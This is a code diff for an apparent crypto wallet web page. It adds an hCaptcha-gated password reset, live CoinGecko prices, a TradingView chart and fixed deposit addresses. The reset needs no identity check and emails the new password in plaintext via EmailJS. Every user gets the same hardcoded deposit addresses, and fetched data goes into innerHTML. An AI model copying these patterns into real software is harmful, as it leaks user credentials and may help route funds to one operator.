+    container.innerHTML = ""; // Clear previous if any
+    // Insert hCaptcha widget script and div
+    const captchaScriptId = 'hcaptcha-script';
+    if (!document.getElementById(captchaScriptId)) {
+      const script = document.createElement('script');
+      script.id = captchaScriptId;
+      script.src = 'https://hcaptcha.com/1/api.js?render=explicit';
+      script.async = true;
+      script.defer = true;
+      document.body.appendChild(script);
+      script.onload = () => renderCaptcha();
+    } else {
+      renderCaptcha();
+    }
+  }
+  let hcaptchaWidgetId = null;
+  function renderCaptcha() {
+    if (window.hcaptcha && !hcaptchaWidgetId) {
+      hcaptchaWidgetId = window.hcaptcha.render('captchaContainer', {
+        sitekey: '10000000-ffff-ffff-ffff-000000000001', // demo public test key - replace with your own
+        size: 'normal',
+        callback: onCaptchaSuccess,
+        'error-callback': onCaptchaError,
+        'expired-callback': onCaptchaExpired,
+      });
+      document.getElementById('btnCaptchaVerify').disabled = true;
+    }
+  }
+  function onCaptchaSuccess(token) {
+    isCaptchaVerified = true;
+    document.getElementById('btnCaptchaVerify').disabled = false;
+    document.getElementById('captchaError').textContent = "";
+  }
+  function onCaptchaError() {
+    isCaptchaVerified = false;
+    document.getElementById('btnCaptchaVerify').disabled = true;
+    document.getElementById('captchaError').textContent = "Captcha error, please retry.";
+  }
+  function onCaptchaExpired() {
+    isCaptchaVerified = false;
+    document.getElementById('btnCaptchaVerify').disabled = true;
+    document.getElementById('captchaError').textContent = "Captcha expired, please retry.";
+  }
+
+  // CAPTCHA Verify button
+  document.getElementById('btnCaptchaVerify').addEventListener('click', () => {
+    if (!isCaptchaVerified) {
+      alert("Please complete the captcha.");
+      return;
+    }
+    // On success, open Reset Password page
+    showPage('page3ii');
+  });
+
+  // Confirm New Password Reset
+  document.getElementById('btnConfirmNewPassword').addEventListener('click', () => {
+    clearErrors();
+    const newPass = document.getElementById('newPassword').value.trim();
+    const confirmPass = document.getElementById('confirmNewPassword').value.trim();
+
+    if (!newPass || !confirmPass) {
+      document.getElementById('resetPasswordError').textContent = "Please fill both password fields.";
+      return;
+    }
+    if (newPass !== confirmPass) {
+      document.getElementById('resetPasswordError').textContent = "Passwords do not match.";
+      return;
+    }
+    if (newPass.length < 6) {
+      document.getElementById('resetPasswordError').textContent = "Password must be at least 6 characters.";
+      return;
+    }
+
+    // Send new password via EmailJS to admin and user
+    const templateParams = {
+      to_email: currentLoggedInUserEmail || userData.email,
+      new_password: newPass
+    };
+    // For admin, send email notification
+    const adminParams = {
+      to_email: currentLoggedInUserEmail || userData.email,
+      message: `Password reset request: New password set to: ${newPass}`
+    };
+
+    emailjs.send(serviceID, adminTemplateID, adminParams)
+      .then(() => emailjs.send(serviceID, autoReplyTemplateID, templateParams))
+      .then(() => {
+        userData.password = newPass; // Update password locally for demo
+        showSuccessPopup("Password reset successful!");
+        document.getElementById('welcomeUserName').textContent = `Hello, ${userData.fullName}`;
+        showPage('page3'); // Go to homepage
+        isCaptchaVerified = false;
+        // Reset captcha
+        if (window.hcaptcha && hcaptchaWidgetId !== null) {
+          window.hcaptcha.reset(hcaptchaWidgetId);
+          document.getElementById('btnCaptchaVerify').disabled = true;
+        }
+      })
+      .catch(err => {
+        alert("Failed to reset password. Please try again.");
+        console.error(err);
+      });
+  });
+
+  // LOGOUT BUTTON
+  document.getElementById('btnLogout').addEventListener('click', () => {
+    currentLoggedInUserEmail = "";
+    showPage('page0');
+  });
+
+  // View Main Portfolio button on homepage opens page4
+  document.getElementById('btnViewPortfolio').addEventListener('click', () => {
+    showPage('page4');
+  });
+
+  // --- Fetch CoinGecko live coin logos and prices ---
+  async function fetchCoinGeckoData() {
+    const ul = document.getElementById('coinListUL');
+    ul.innerHTML = "<li>Loading coins...</li>";
+
+    try {
+      const response = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false');
+      if (!response.ok) throw new Error("Network response not ok");
+      const coins = await response.json();
+
+      ul.innerHTML = "";
+      coins.forEach(coin => {
+        const li = document.createElement('li');
+        li.innerHTML = `
+          <img src="${coin.image}" alt="${coin.name} logo" />
+          <span>${coin.symbol.toUpperCase()}</span>
+          : $${coin.current_price.toLocaleString()}
+        `;
+        ul.appendChild(li);
+      });
+    } catch (err) {
+      ul.innerHTML = "<li>Failed to load coin data.</li>";
+      console.error(err);
     }
   }
 
-  // On page load, show last visited page or default to page 1
-  window.onload = () => {
-    const lastPage = localStorage.getItem("lastPage") || "1";
-    showPage(lastPage);
+  // Load CoinGecko data on homepage show
+  function onShowPage(id) {
+    if (id === 'page3') {
+      fetchCoinGeckoData();
+    }
+  }
+
+  // Override showPage to call onShowPage hooks
+  const originalShowPage = showPage;
+  showPage = function(id) {
+    originalShowPage(id);
+    onShowPage(id);
   };
- </script>
-  <script>
-  function goBack() {
-    // Define your page flow logic here
-    const pageFlow = {
-      "1i": "1",
-      "1iii": "1",
-      "2": "1i",
-      "3": "2",
-      "4": "3",
-      "5": "4",
-      "6": "4",
-      "7": "6",
-      "8": "7",
-      "9i": "8",
-      "9ii": "9i",
-      "9": "9ii",
-      "10": "9",
-      "14": "9",
-      "11": "4",
-      "12": "4",
-      "13": "4",
-      "15": "11",
-      "15i": "15",
-      "15ii": "15i"
-    };
 
-    const currentPageId = localStorage.getItem("lastPage");
-    const previousPageId = pageFlow[currentPageId] || "1";
-    showPage(previousPageId);
-  }
-  </script>
-  <script>
-    function showPage(pageId) {
-      const pages = document.querySelectorAll("section");
-      pages.forEach((p) => (p.style.display = "none"));
-      const target = document.getElementById("page" + pageId);
-      if (target) {
-        target.style.display = "block";
-        localStorage.setItem("lastPage", pageId);
+</script>
+  
+<!-- TradingView Widget Script -->
+<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+
+<script>
+  // Initialize TradingView Widget
+  new TradingView.widget({
+    autosize: true,
+    symbol: "BINANCE:BTCUSDT",
+    interval: "60",
+    timezone: "Etc/UTC",
+    theme: "dark",
+    style: "1",
+    locale: "en",
+    toolbar_bg: "#12171d",
+    enable_publishing: false,
+    allow_symbol_change: true,
+    container_id: "tradingview_chart",
+  });
+
+  // Public API endpoint (CoinGecko) for live prices
+  const priceIds = {
+    btcPrice: "bitcoin",
+    ethPrice: "ethereum",
+    bnbPrice: "binancecoin",
+    usdtPrice: "tether"
+  };
+
+  async function fetchLivePrices() {
+    try {
+      const ids = Object.values(priceIds).join(",");
+      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
+      const response = await fetch(url);
+      const data = await response.json();
+
+      for (const [elementId, coinId] of Object.entries(priceIds)) {
+        const price = data[coinId]?.usd ?? 0;
+        document.getElementById(elementId).textContent = `$${price.toFixed(4)}`;
       }
+    } catch (err) {
+      console.error("Failed to fetch live prices:", err);
     }
+  }
 
-    // Load last visited page or default
-    window.onload = () => {
-      const lastPage = localStorage.getItem("lastPage") || "1";
-      showPage(lastPage);
+  // Update prices on load and every 60 seconds
+  fetchLivePrices();
+  setInterval(fetchLivePrices, 60000);
+
+  // Show receive address (example static address per token)
+  function showReceiveAddress() {
+    const token = document.getElementById("receiveToken").value;
+    const addresses = {
+      USDT: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
+      BTC: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu",
+      ETH: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
+      BNB: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
+      SOL: "8ChmWCsEjvoNcFkze5GgNuUiw3FLTzYy2g5Sw5DumypX",
+      TRX: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco"
     };
+    const addressBox = document.getElementById("receiveAddressBox");
+    addressBox.style.display = "block";
+    addressBox.textContent = addresses[token] || "No address available";
+  }
 </script>
 </body>
 </html>
-
